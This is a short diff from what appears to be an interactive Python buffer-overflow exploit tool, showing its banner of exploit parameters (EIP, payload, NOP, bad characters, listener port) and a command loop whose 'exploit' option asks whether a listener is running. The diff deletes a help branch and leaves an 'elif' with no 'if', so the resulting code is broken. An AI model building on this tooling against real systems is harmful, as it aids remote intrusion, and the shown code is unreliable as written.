@@ -30,8 +30,6 @@ final_package = ""
 print(f"{green}HEY USER!\n{yellow}$eip={eip}\n$ip={ip}\n$port={port}\n$bytes_limit={bytes_limit}\n$payload={payload}\n$nop={nop}\n$localhost={localhost}\n$badchars={badchars}\n$localport={localport}\n\n{red}$suffix={suffix}\n$prefix={prefix}{reset}")
 while True:
     command = input(f"{cyan}Command  >>  {reset}")
-    if command == "help":
-        print("COMANDS")
     elif command == "exploit":
         if input(f"Do you have a listener on? (Y/n)  >>  {reset}").lower() == "y":
                 try:
